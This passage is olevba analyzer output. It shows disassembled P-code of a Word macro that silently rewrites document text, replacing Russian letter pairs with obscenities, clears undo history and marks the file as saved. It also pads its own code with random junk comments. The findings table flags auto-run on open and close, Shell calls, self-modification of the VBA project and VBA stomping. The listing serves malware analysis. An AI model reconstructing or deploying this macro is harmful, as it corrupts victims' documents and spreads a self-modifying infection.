' 	QuoteRem 0x0000 0x0009 " 2394.083"
' Line #204:
' 	LineCont 0x0008 08 00 03 00 0C 00 0E 00
' 	LitStr 0x0002 "гр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "говн"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #205:
' 	LineCont 0x0004 08 00 07 00
' 	LitStr 0x0002 "жр"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "жоп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #206:
' 	LineCont 0x0008 04 00 04 00 08 00 10 00
' 	LitStr 0x0002 "зр"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "залуп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #207:
' Line #208:
' Line #209:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x0002 "дж"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "джоп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #210:
' 	LineCont 0x000C 04 00 03 00 08 00 06 00 0C 00 09 00
' 	LitStr 0x0003 "кал"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "дер"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #211:
' 	QuoteRem 0x0007 0x0009 " 2753.138"
' Line #212:
' 	QuoteRem 0x0000 0x0009 " 4720.349"
' Line #213:
' 	QuoteRem 0x0000 0x0009 " 508.8407"
' Line #214:
' 	LineCont 0x0004 08 00 0A 00
' 	LitStr 0x0003 "бух"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "бряк"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	LineCont 0x0004 01 00 03 00
' 	EndWith 
' Line #219:
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall UndoClear 0x0000 
' Line #220:
' 	LineCont 0x0008 03 00 07 00 04 00 0C 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #221:
' 	LineCont 0x0008 03 00 0A 00 04 00 08 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #222:
' 	LineCont 0x0004 04 00 0A 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #223:
' 	LineCont 0x0004 01 00 05 00
' 	EndIfBlock 
' Line #224:
' 	Ld m 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #225:
' 	QuoteRem 0x0002 0x0009 " 950.2953"
' Line #226:
' 	LineCont 0x0004 01 00 07 00
' 	EndIfBlock 
' Line #227:
' 	QuoteRem 0x000C 0x0009 " 9933.281"
' Line #228:
' 	LineCont 0x0004 01 00 0A 00
' 	EndWith 
' Line #229:
' Line #230:
' 	StartForVariable 
' 	Next 
' Line #231:
' 	QuoteRem 0x0006 0x0009 " 4221.495"
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	QuoteRem 0x000E 0x0008 " 6890.69"
' Line #234:
' 	QuoteRem 0x0000 0x0009 " 4952.252"
' Line #235:
' 	QuoteRem 0x0000 0x0008 " 9210.85"
' Line #236:
' 	QuoteRem 0x0000 0x0009 " 7992.755"
' Line #237:
' 	LineCont 0x0004 01 00 0C 00
' 	EndSub 
' Line #238:
' 	LineCont 0x001C 01 00 06 00 06 00 08 00 07 00 07 00 0A 00 0A 00 0B 00 09 00 10 00 0F 00 13 00 03 00
' 	FuncDefn (Private Function foo(ByRef s As String, ByRef i As Long, ByRef res As String, id_FFFE As Boolean) As Boolean)
' Line #239:
' 	LineCont 0x0004 03 00 0D 00
' 	Dim 
' 	VarDefn tmp (As String)
' Line #240:
' 	QuoteRem 0x000D 0x0009 " 3975.716"
' Line #241:
' 	QuoteRem 0x0000 0x0009 " 2676.312"
' Line #242:
' 	LineCont 0x0018 06 00 0D 00 0B 00 0F 00 0C 00 04 00 11 00 04 00 12 00 04 00 14 00 0D 00
' 	Ld s 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #243:
' 	QuoteRem 0x0003 0x0009 " 8794.927"
' Line #244:
' 	LineCont 0x0008 01 00 05 00 02 00 03 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #245:
' 	QuoteRem 0x0010 0x0009 " 2880.688"
' Line #246:
' 	QuoteRem 0x0000 0x0009 " 5347.534"
' Line #247:
' 	LineCont 0x0004 01 00 10 00
' 	ExitFunc 
' Line #248:
' 	QuoteRem 0x0003 0x0008 " 8582.16"
' Line #249:
' 	QuoteRem 0x0000 0x0009 " 5127.285"
' Line #250:
' 	EndIfBlock 
' Line #251:
' 	LineCont 0x0014 01 00 04 00 05 00 08 00 07 00 0B 00 0C 00 00 00 0E 00 07 00
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #252:
' 	LineCont 0x0014 01 00 02 00 02 00 0D 00 04 00 0A 00 08 00 09 00 0D 00 02 00
' 	Ld res 
' 	Ld s 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	St res 
' Line #253:
' 	LineCont 0x0004 01 00 0F 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #254:
' 	LineCont 0x0004 01 00 06 00
' 	ExitFunc 
' Line #255:
' 	QuoteRem 0x000D 0x0009 " 5829.273"
' Line #256:
' 	LineCont 0x0004 01 00 0F 00
' 	EndIfBlock 
' Line #257:
' 	QuoteRem 0x000B 0x0009 " 9278.597"
' Line #258:
' 	QuoteRem 0x0000 0x0009 " 4815.313"
' Line #259:
' 	QuoteRem 0x0000 0x0009 " 2696.402"
' Line #260:
' 	LineCont 0x0008 03 00 05 00 04 00 07 00
' 	Ld res 
' 	Ld s 
' 	Concat 
' 	St tmp 
' Line #261:
' 	QuoteRem 0x0006 0x0009 " 6215.812"
' Line #262:
' 	QuoteRem 0x0000 0x0009 " 5875.384"
' Line #263:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #264:
' 	LitDI2 0x0001 
' 	St i 
' Line #265:
' 	LineCont 0x0004 01 00 0F 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	While 
' Line #266:
' 	QuoteRem 0x000D 0x0009 " 6383.402"
' Line #267:
' 	LineCont 0x000C 01 00 04 00 03 00 0D 00 04 00 0B 00
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FE9 
' 	Lt 
' 	IfBlock 
' Line #268:
' 	QuoteRem 0x0007 0x0009 " 1755.991"
' Line #269:
' 	QuoteRem 0x0000 0x0009 " 6889.289"
' Line #270:
' 	QuoteRem 0x0000 0x0009 " 931.2332"
' Line #271:
' 	QuoteRem 0x0000 0x0009 " 8616.979"
' Line #272:
' 	QuoteRem 0x0000 0x0009 " 7634.447"
' Line #273:
' 	LineCont 0x001C 01 00 01 00 02 00 04 00 03 00 06 00 04 00 01 00 05 00 03 00 06 00 0A 00 09 00 08 00
' 	Ld res 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	St res 
' Line #274:
' 	LineCont 0x0004 01 00 02 00
' 	EndIfBlock 
' Line #275:
' 	QuoteRem 0x0008 0x0009 " 5379.174"
' Line #276:
' 	LineCont 0x0008 02 00 08 00 04 00 05 00
' 	Ld res 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St res 
' Line #277:
' 	LineCont 0x0008 03 00 0F 00 04 00 0D 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #278:
' 	QuoteRem 0x000F 0x0009 " 5024.019"
' Line #279:
' Line #280:
' 	Wend 
' Line #281:
' 	QuoteRem 0x000F 0x0009 " 4636.635"
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x0009 " 9401.992"
' Line #284:
' 	LineCont 0x0004 03 00 05 00
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld tmp 
' 	FnLen 
' 	For 
' Line #285:
' 	LineCont 0x000C 01 00 04 00 03 00 02 00 04 00 0B 00
' 	Ld res 
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St res 
' Line #286:
' 	LineCont 0x0014 01 00 0F 00 05 00 0F 00 07 00 03 00 09 00 0B 00 0A 00 10 00
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #287:
' Line #288:
' 	LineCont 0x0008 01 00 05 00 04 00 09 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #289:
' 	QuoteRem 0x0009 0x0009 " 8206.482"
' Line #290:
' 	LineCont 0x0014 01 00 0C 00 04 00 0A 00 05 00 00 00 06 00 02 00 0E 00 04 00
' 	Ld res 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	St res 
' Line #291:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #292:
' 	QuoteRem 0x0007 0x0009 " 599.7574"
' Line #293:
' Line #294:
' Line #295:
' 	EndIfBlock 
' Line #296:
' 	QuoteRem 0x000B 0x0009 " 5509.322"
' Line #297:
' 	LineCont 0x0004 01 00 0C 00
' 	EndIfBlock 
' Line #298:
' 	QuoteRem 0x0010 0x0009 " 997.2936"
' Line #299:
' 	QuoteRem 0x0000 0x0009 " 5703.586"
' Line #300:
' 	QuoteRem 0x0000 0x0009 " 1174.576"
' Line #301:
' 	StartForVariable 
' 	Next 
' Line #302:
' 	QuoteRem 0x000F 0x0009 " 3788.384"
' Line #303:
' 	QuoteRem 0x0000 0x0009 " 1923.119"
' Line #304:
' 	QuoteRem 0x0000 0x0009 " 6239.736"
' Line #305:
' 	QuoteRem 0x0000 0x0009 " 6045.457"
' Line #306:
' 	LineCont 0x0004 02 00 0D 00
' 	LitVarSpecial (True)
' 	St foo 
' Line #307:
' 	LineCont 0x0004 01 00 0E 00
' 	EndFunc 
' Line #308:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

